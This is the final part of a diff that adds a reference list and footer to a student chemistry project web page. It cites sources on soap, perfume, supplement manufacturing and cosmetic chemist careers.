+                <li style="margin-bottom: 12px;"><strong>Chagrin Valley Soap & Salve Blog, "The Chemistry of Soap Making."</strong> - An industry blog that offered practical insights into soap formulation, including the roles of different fatty acids in determining soap properties.</li>
+                
+                <li style="margin-bottom: 12px;"><strong>ChemistryIsLife.com, "The Chemistry of Perfume."</strong> - This source provided detailed information about how fragrances are constructed with top, middle, and base notes, and the principles behind cologne formulation.</li>
+                
+                <li style="margin-bottom: 12px;"><strong>Alpha Aromatics, "How Perfume Is Made."</strong> - An industry guide that outlined the manufacturing processes for colognes and perfumes, from essential oil extraction to blending and aging.</li>
+                
+                <li style="margin-bottom: 12px;"><strong>Vitaquest Blog, "Concept To Shelf: Manufacturing Dietary Supplements."</strong> - This source detailed the production process for supplements, from formulation to quality control and packaging.</li>
+                
+                <li style="margin-bottom: 12px;"><strong>Harvard Health, "The hidden dangers of protein powders."</strong> - An academic health publication that provided balanced information about potential risks associated with supplement consumption.</li>
+                
+                <li style="margin-bottom: 12px;"><strong>Mayo Clinic Press, "Ingredients to look for in a protein powder."</strong> - A medical resource that offered insights into the nutritional aspects of protein supplements and their compositions.</li>
+                
+                <li style="margin-bottom: 12px;"><strong>Careers.SLAS.org, "What does a Cosmetic Chemist do?"</strong> - A professional society publication providing career information, typical responsibilities, and workplace environments for cosmetic chemists.</li>
+                
+                <li style="margin-bottom: 12px;"><strong>Indeed.com, "How to Become a Cosmetic Chemist."</strong> - A career resource detailing education requirements and career paths for aspiring cosmetic chemists.</li>
+                
+                <li style="margin-bottom: 12px;"><strong>ZipRecruiter, "Cosmetic Chemist Salary."</strong> - Provided current compensation data for cosmetic chemists in various regions and with different experience levels.</li>
+                
+                <li style="margin-bottom: 12px;"><strong>BMV Fragrances, "The Science of Fragrance Oils."</strong> - An industry source offering detailed information about fragrance compounds and their chemical properties.</li>
+                
+                <li style="margin-bottom: 12px;"><strong>Healthline, "How Is Protein Powder Made?"</strong> - A consumer health resource that explained the manufacturing processes for various types of protein supplements.</li>
+            </ol>
+        </div>
+    </div>
+    
+    <footer>
+        <div class="container">
+            <p>Chemistry Project by Evans Cheraisi | May 9, 2025</p>
+        </div>
+    </footer>
 </body>
 </html>
